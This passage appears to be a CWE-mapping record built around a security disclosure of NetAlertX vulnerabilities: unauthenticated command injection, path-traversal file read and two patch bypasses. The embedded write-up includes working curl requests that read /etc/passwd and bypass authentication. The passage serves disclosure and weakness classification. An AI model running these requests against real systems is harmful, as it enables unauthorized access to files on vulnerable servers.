The saveSettings() function will update the plugin command and automatically reload the application, which involves executing each plugin that is set to execute on initialization. This results in RCE!\\n\\n## CVE-2024-48766: Unauthenticated Arbitrary File Read\\n\\nA similar issue was also identified with the logs.php endpoint. Attackers could request a log file and read sensitive files due to no authentication being required and a path traversal vulnerability:\\n\\n```\\ncurl -X POST http://192.168.1.33:20211/php/components/logs.php -d 'items=[{\\\"buttons\\\":[{\\\"labelStringCode\\\":\\\"Maint_PurgeLog\\\",\\\"event\\\":\\\"logManage(\\'app.log\\', \\'cleanLog\\')\\\"},{\\\"labelStringCode\\\":\\\"Maint_RestartServer\\\",\\\"event\\\":\\\"askRestartBackend()\\\"}],\\\"fileName\\\":\\\"passwd\\\",\\\"filePath\\\":\\\"/app/front/../../../../../../etc/passwd\\\",\\\"textAreaCssClass\\\":\\\"logs\\\"}]'\\n```\\n\\n## The initial patch commit bypasses\\n\\n### Bypass 1: Execute After Redirect (EAR) leads to authentication bypass\\n\\nTo exploit this bypass, we don\u2019t need to change the original curl command for the LFI vulnerability. To fix this, the application will need to call \u201cexit;\u201d after sending the Location header to the client.\\n\\n```\\ncurl -X POST http://192.168.1.33:20211/php/components/logs.php -d 'items=[{\\\"buttons\\\":[{\\\"labelStringCode\\\":\\\"Maint_PurgeLog\\\",\\\"event\\\":\\\"logManage(\\'app.log\\', \\'cleanLog\\')\\\"},{\\\"labelStringCode\\\":\\\"Maint_RestartServer\\\",\\\"event\\\":\\\"askRestartBackend()\\\"}],\\\"fileName\\\":\\\"passwd\\\",\\\"filePath\\\":\\\"/app/front/../../../../../../etc/passwd\\\",\\\"textAreaCssClass\\\":\\\"logs\\\"}]'\\n```\\n\\n### Bypass 2: Insecure usage of strpos() leads to authentication bypass\\n\\nWe can simply add a parameter to the end of the URL and set isLogonPage to be true (despite not requesting the login page, allowing us to bypass the authentication checks).\\n\\n```\\ncurl -X POST http://192.168.1.33:20211/php/components/logs.php?bypass=index.php -d\\n'items=[{\\\"buttons\\\":[{\\\"labelStringCode\\\":\\\"Maint_PurgeLog\\\",\\\"event\\\":\\\"logManage(\\'app.log\\', \\'cleanLog\\')\\\"},\\n{\\\"labelStringCode\\\":\\\"Maint_RestartServer\\\",\\\"event\\\":\\\"askRestartBackend()\\\"}],\\\"fileName\\\":\\\"passwd\\\",\\\"filePath\\\":\\\"/app/front/../../../../../../etc/passwd\\\",\\\"textAreaCssClass\\\":\\\"logs\\\"}]'\\n```\\n\\nThe new version of NetAlertX was then released with both patches.\\n\\n## Conclusion\\n\\nWe found CVE-2024-46506 while auditing the codebase of NetAlertX due to its interesting position within a LAN. We leveraged an unauthenticated command injection vulnerability to achieve RCE on the application server and gain access to the LAN. We reviewed the initial patch and communicated additional bypasses with the NetAlertX team which were quickly fixed.\\n\\n**Researcher/Author:** <https://x.com/_chebuya>\\n\\n## Related Resources\\n\\n### Multiple CVEs in Infoblox NetMRI: RCE, Auth Bypass, SQLi, and File Read Vulnerabilities\\n\\n### CVE-2025-26147: Authenticated RCE In Denodo Scheduler\\n\\n### CVE-2024-55963: Unauthenticated RCE in Default-Install of Appsmith\\n\",\n  \"details\": [\n    {\n      \"vulnerability\": \"Unauthenticated command injection via settings update\",\n      \"root_cause\": \"The backend does not verify authentication on the request.\",\n      \"attack_vectors\": [\n        \"Sending a POST request with the data \u201cfunction=savesettings\u201d to util.php\"\n      ],\n      \"impact\": \"RCE (Remote Code Execution)\",\n      \"attacker_capabilities\": \"Unauthenticated\",\n      \"fix\": \"The new version of NetAlertX was then released with both patches.\",\n      \"more_info\": \"Provides more detail than the official CVE description.\"\n    },\n    {\n      \"vulnerability\": \"Unauthenticated Arbitrary File Read\",\n      \"attack_vectors\": [\n        \"Sending a POST request to logs.php with crafted parameters to read sensitive files due to no authentication being required and a path traversal vulnerability.\"\n      ],\n      \"impact\": \"Reading sensitive files\",\n      \"attacker_capabilities\": \"Unauthenticated\",\n      \"fix\": \"The new version of NetAlertX was then released with both patches.\",\n      \"more_info\": \"Provides more detail than the official CVE description.\"\n    },\n    {\n      \"vulnerability\": \"Bypass 1: Execute After Redirect (EAR) leads to authentication bypass\",\n      \"attack_vectors\": [\n        \"Using the original curl command for the LFI vulnerability.\"\n      ],\n      \"impact\": \"Authentication bypass\",\n      \"fix\": \"The application will need to call \u201cexit;\u201d after sending the Location header to the client.\",\n      \"more_info\": \"Provides more detail than the official CVE description.\"\n    },\n    {\n      \"vulnerability\": \"Bypass 2: Insecure usage of strpos() leads to authentication bypass\",\n      \"attack_vectors\": [\n        \"Adding a parameter to the end of the URL to bypass authentication checks.\"\n      ],\n      \"impact\": \"Authentication bypass\",\n      \"fix\": \"The new version of NetAlertX was then released with both patches.\",\n      \"more_info\": \"Provides more detail than the official CVE description.\"\n    }\n  ]\n}\n```",

This relationship indicates that CWE-78 is a more specific form of command injection. Additionally, the root cause indicates a missing authentication issue (CWE-306), so the command injection can be performed without authentication.\n\n```mermaid\ngraph TD\n    cwe78[\"CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"]\n    cwe77[\"CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')\"]\n    cwe306[\"CWE-306: Missing Authentication for Critical Function\"]\n\n    cwe78 -->|CHILDOF| cwe77\n    cwe78 -->|CANPRECEDE| cwe306\n\n    classDef primary fill:#f96,stroke:#333,stroke-width:2px\n    classDef secondary fill:#69f,stroke:#333\n    class cwe78 primary\n    class cwe77,cwe306 secondary\n```\n\n## Vulnerability Chain\nThe vulnerability chain starts with **CWE-306 (Missing Authentication for Critical Function)**, which allows an unauthenticated attacker to send a POST request with \"function=savesettings\". This triggers **CWE-78 (Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection'))** because the `saveSettings()` function updates the plugin command without proper neutralization, resulting in RCE.\n\n## Summary of Analysis\nThe primary weakness is **CWE-78 (Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection'))** because the product does not neutralize special elements, leading to command injection. The root cause is **CWE-306 (Missing Authentication for Critical Function)**, as the `savesettings` function **lacks an authentication requirement**.\n\nThe initial assessment identified CWE-78 as the primary issue, aligning with the vulnerability's **command injection** aspect. However, considering the root cause of **missing authentication**, CWE-306 was added as a secondary CWE to represent the initial flaw that allowed the exploitation. The final decision reflects the importance of capturing both the immediate weakness (CWE-78) and the underlying security control failure (CWE-306).\n\nThe selection of CWE-78 and CWE-306 is optimal because they accurately represent the vulnerability's specific characteristics and root cause, respectively. They also align with the MITRE mapping guidance and are at the appropriate level of specificity.\n\nRelevant CWE Information:\n\n# Enhanced Context (25 CWEs)\nThe following CWEs were identified as potentially relevant to this vulnerability:\n\n## CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n**Abstraction Level**: Class\n**Similarity Score**: 0.77\n**Source**: dense\n\n**Description**:\nThe product constructs all or part of a command, data structure, or record using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify how it is parsed or interpreted when it is sent to a downstream component.\n\n**Mapping Guidance**:\n- Usage: Discouraged\n- Rationale: CWE-74 is high-level and often misused when lower-level weaknesses are more appropriate.\n\n## CWE-41: Improper Resolution of Path Equivalence\n**Abstraction Level**: Base\n**Similarity Score**: 0.76\n**Source**: dense\n\n**Description**:\nThe product is vulnerable to file system contents disclosure through path equivalence.
